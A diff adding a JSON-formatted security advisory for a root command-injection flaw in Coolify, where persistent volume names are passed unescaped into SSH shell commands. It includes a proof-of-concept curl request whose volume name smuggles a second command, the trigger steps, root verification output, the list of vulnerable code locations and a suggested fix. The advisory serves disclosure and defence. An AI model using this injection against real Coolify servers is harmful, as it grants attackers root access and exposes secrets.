@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-6pmw-6m96-4v4m",
+  "repo": {
+    "cve_id": "CVE-2026-42143",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "# OS Command Injection via Persistent Volume Names - Root RCE on Managed Servers\r\n\r\n## Summary\r\n\r\nUser-controlled persistent volume names are interpolated directly into shell commands executed on managed servers via SSH, without any escaping or character validation. An authenticated user with any team role (including the lowest-privilege `member` role) can inject arbitrary OS commands by setting a volume name containing shell metacharacters. These commands execute as **root** on every managed server in the Coolify instance.\r\n\r\n## Details\r\n\r\n\r\n## Proof of Concept\r\n\r\nTested against Coolify v4.0.0-beta.470 running in the official Docker development environment with the localhost server configured. Validated with both an `owner` and a `member`-role user.\r\n\r\n### Step 1 - Create a malicious volume via the API (as member-role user)\r\n\r\n```bash\r\ncurl -X POST \\\r\n  -H \"Authorization: Bearer <MEMBER_API_TOKEN>\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"type\":\"persistent\",\"name\":\"poc;touch /tmp/coolify-rce-proof;#\",\"mount_path\":\"/data/test\"}' \\\r\n  http://localhost:8000/api/v1/databases/<DATABASE_UUID>/storages\r\n```\r\n\r\nResponse (note the unescaped semicolons stored as-is):\r\n\r\n```json\r\n{\r\n  \"name\": \"<db-uuid>-poc;touch /tmp/coolify-rce-proof;#\",\r\n  \"mount_path\": \"/data/test\",\r\n  \"resource_type\": \"App\\\\Models\\\\StandalonePostgresql\"\r\n}\r\n```\r\n\r\n### Step 2 - Trigger the injection\r\n\r\nDelete the database resource with \"Delete Volumes\" enabled (via UI or API). This calls `StandalonePostgresql::deleteVolumes()`, which executes:\r\n\r\n```\r\ndocker volume rm -f <db-uuid>-poc;touch /tmp/coolify-rce-proof;#\r\n```\r\n\r\nThe shell interprets this as three separate commands:\r\n1. `docker volume rm -f <db-uuid>-poc` - fails harmlessly\r\n2. `touch /tmp/coolify-rce-proof` - **attacker-controlled command**\r\n3. `#` - comment, remainder ignored\r\n\r\n### Step 3 - Verify\r\n\r\n```bash\r\n# On the managed server:\r\nls -la /tmp/coolify-rce-proof\r\n# -rw-r--r-- 1 root root 0 Mar 29 10:27 /tmp/coolify-rce-proof\r\n```\r\n\r\nA second payload using `id > /tmp/coolify-rce-whoami` confirmed execution context:\r\n\r\n```\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\nThe `member` role is explicitly denied terminal access but can achieve the same root-level command execution through this vulnerability.\r\n\r\n## Impact\r\n\r\nThis vulnerability allows any authenticated Coolify user - including the lowest-privilege `member` role - to execute arbitrary commands as **root** on any managed server connected to their team, bypassing terminal access restrictions. The impact includes:\r\n\r\n- **Privilege escalation** - `member` users gain root shell access they are explicitly denied via the terminal UI\r\n- **Full server compromise** - read/write access to the entire filesystem of managed servers\r\n- **Container escape** - access to all Docker containers, images, and volumes on the host\r\n- **Secret exfiltration** - environment variables, TLS certificates, database credentials, API keys\r\n- **Lateral movement** - if SSH keys are reused across servers, a single injection compromises all of them\r\n- **Supply chain risk** - ability to modify deployed application code and container images\r\n\r\nBecause Coolify connects to managed servers as root via SSH, there is no privilege boundary between the application and the underlying infrastructure.\r\n### Vulnerable Input\r\n\r\nVolume names are accepted through both the Livewire UI (`app/Livewire/Project/Shared/Storages/Show.php`) and the REST API (`app/Http/Controllers/Api/DatabasesController.php`, `ApplicationsController.php`). The only validation applied is:\r\n\r\n```php\r\n'name' => 'required|string'\r\n```\r\n\r\nThe model (`app/Models/LocalPersistentVolume.php`) has `$guarded = []` (mass assignment unprotected) and its only mutator (`customizeName`) merely trims whitespace. No characters are rejected or escaped.\r\n\r\n### Vulnerable Sinks\r\n\r\nThe volume name is interpolated directly into shell commands via PHP string interpolation:\r\n\r\n```php\r\n// app/Models/StandalonePostgresql.php:117 (and 9 other identical sinks)\r\ninstant_remote_process([\"docker volume rm -f $storage->name\"], $server, false);\r\n```\r\n\r\n```php\r\n// app/Jobs/VolumeCloneJob.php:47-48\r\ninstant_remote_process([\"docker volume create $this->targetVolume\"], $server);\r\n```\r\n\r\nAll 12 affected locations across the codebase:\r\n\r\n| File | Line |\r\n|------|------|\r\n| `app/Models/StandalonePostgresql.php` | 117 |\r\n| `app/Models/StandaloneMysql.php` | 139 |\r\n| `app/Models/StandaloneMariadb.php` | 139 |\r\n| `app/Models/StandaloneMongodb.php` | 144 |\r\n| `app/Models/StandaloneRedis.php` | 143 |\r\n| `app/Models/StandaloneClickhouse.php` | 138 |\r\n| `app/Models/StandaloneKeydb.php` | 138 |\r\n| `app/Models/StandaloneDragonfly.php` | 138 |\r\n| `app/Models/Application.php` | 393 |\r\n| `app/Actions/Service/DeleteService.php` | 36 |\r\n| `app/Jobs/VolumeCloneJob.php` | 47-48 |\r\n| `app/Jobs/VolumeCloneJob.php` | 59-61 |\r\n\r\n### Execution Path\r\n\r\n```\r\nUser input (volume name)\r\n  → LocalPersistentVolume model (no sanitization)\r\n  → deleteVolumes() / VolumeCloneJob (string interpolation into command)\r\n  → instant_remote_process()\r\n  → SshMultiplexingHelper::generateSshCommand()\r\n  → SSH connection with `bash -se` heredoc\r\n  → Command executes as root on managed server\r\n```\r\n\r\nThe `bash -se` heredoc faithfully interprets all shell metacharacters (`;`, `|`, `$()`, backticks, etc.) within the injected volume name.\r\n\r\n## Suggested Fix\r\n\r\nApply both input validation and output escaping (defense in depth):\r\n\r\n```php\r\n// 1. Strict validation on volume name input (API controllers + Livewire components)\r\n'name' => ['required', 'string', 'regex:/^[a-zA-Z0-9][a-zA-Z0-9._-]*$/']\r\n\r\n// 2. Escape in all shell command construction (all 12 sink locations)\r\ninstant_remote_process([\"docker volume rm -f \" . escapeshellarg($storage->name)], $server, false);\r\n```\r\n\r\nA systematic audit of all `instant_remote_process()` call sites for similar interpolation patterns is strongly recommended - the same class of vulnerability likely exists in other user-controlled fields (database passwords, S3 bucket names, backup paths).\r\n",
+    "ghsa_id": "GHSA-6pmw-6m96-4v4m",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-6pmw-6m96-4v4m",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6pmw-6m96-4v4m"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42143"
+      }
+    ],
+    "published_at": "2026-07-02T16:36:14Z",
+    "references": [],
+    "severity": "high",
+    "summary": "OS Command Injection via Persistent Volume Names - Root RCE on Managed Servers",
+    "updated_at": "2026-07-02T16:36:14Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "<= 4.0.0-beta.473"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
